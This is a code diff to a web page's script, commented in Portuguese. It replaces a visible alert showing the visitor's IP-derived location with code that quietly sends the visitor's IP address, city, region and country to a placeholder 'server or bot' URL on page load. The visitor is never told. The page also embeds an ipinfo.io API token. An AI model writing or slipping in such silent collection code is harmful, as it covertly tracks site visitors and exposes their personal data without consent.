@@ -27,7 +27,7 @@
   </div>
 
   <script>
-    // Apenas exibe a data atual
+    // Exibe a data atual
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
@@ -41,9 +41,29 @@
     fetch('https://ipinfo.io/json?token=1aa74ee0199100')
       .then(response => response.json())
       .then(data => {
-        console.log('Localização via IP:', data);
-        // Exibe os dados de localização do usuário (latitude, longitude, cidade, etc)
-        alert(`Localização estimada:\nIP: ${data.ip}\nCidade: ${data.city}\nRegião: ${data.region}\nPaís: ${data.country}`);
+        // Dados de localização coletados do ipinfo.io
+        const locationData = {
+          ip: data.ip,
+          cidade: data.city,
+          regiao: data.region,
+          pais: data.country,
+        };
+
+        // Envia os dados de localização para um servidor ou bot (substitua a URL do seu servidor)
+        fetch('https://seu-servidor-ou-bot-url.com/enviar-localizacao', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(locationData),
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('Localização enviada com sucesso:', data);
+        })
+        .catch(error => {
+          console.error('Erro ao enviar localização:', error);
+        });
       })
       .catch(error => {
         console.error('Erro ao obter localização via IP:', error);
